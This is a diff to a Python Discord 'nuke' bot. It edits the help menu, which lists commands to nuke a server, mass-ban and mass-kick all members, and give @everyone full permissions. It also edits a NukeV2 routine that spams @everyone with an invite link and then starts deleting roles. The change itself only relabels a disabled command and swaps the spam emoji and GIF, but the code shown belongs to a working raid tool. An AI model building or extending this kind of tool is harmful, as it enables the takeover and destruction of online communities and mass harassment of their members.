@@ -272,7 +272,7 @@ class Help(commands.Cog):
                 color=0xFF0044
             )
             embed.add_field(name="`l!setup`", value="Nuke server (Owner no cooldown)", inline=False)
-            embed.add_field(name="`l!super_nuke`", value="Super nuke (120s cooldown)", inline=False)
+            embed.add_field(name="`lệnh đang bị khoá`", value="lệnh đang bị khoá do lỗi code", inline=False)
             embed.add_field(name="`l!massban`", value="Ban all members", inline=False)
             embed.add_field(name="`l!masskick`", value="Kick all members", inline=False)
             embed.add_field(name="`l!perm`", value="Grant full perms to @everyone", inline=False)
@@ -1534,8 +1534,8 @@ class NukeV2:
             return
         self.last_nuke_time = current_time
 
-        spam_content = "# <a:Black_cross:1353971971095793776> **𝔾𝔾.𝕂ℤ3ℕ/𝕂ℤ4ℕ - 𝔹Á 𝕋𝕆ℙ 𝕁𝕆𝕀ℕ 𝕊𝔼ℝ𝕍𝔼ℝ 𝕊𝕌ℙℙ𝕆ℝ𝕋 1 Đ𝕀** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/PVtT85EPn\n> ||Join 2:|| not server support 2"
-        image_url = "https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif"
+        spam_content = "# <:emoji_1470040768453415033:1540558775969120358> **𝔾𝔾.𝕂ℤ3ℕ/𝕂ℤ4ℕ - 𝔹Á 𝕋𝕆ℙ 𝕁𝕆𝕀ℕ 𝕊𝔼ℝ𝕍𝔼ℝ 𝕊𝕌ℙℙ𝕆ℝ𝕋 1 Đ𝕀** <:emoji_1470040768453415033:1540558775969120358>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/PVtT85EPn\n> ||Join 2:|| not server support 2"
+        image_url = "https://i.pinimg.com/originals/00/e3/82/00e38213018124b7f9d81df6cf1b05ca.gif"
 
         await self._log("Starting role deletion...")
         await self.delete_roles(message.guild)
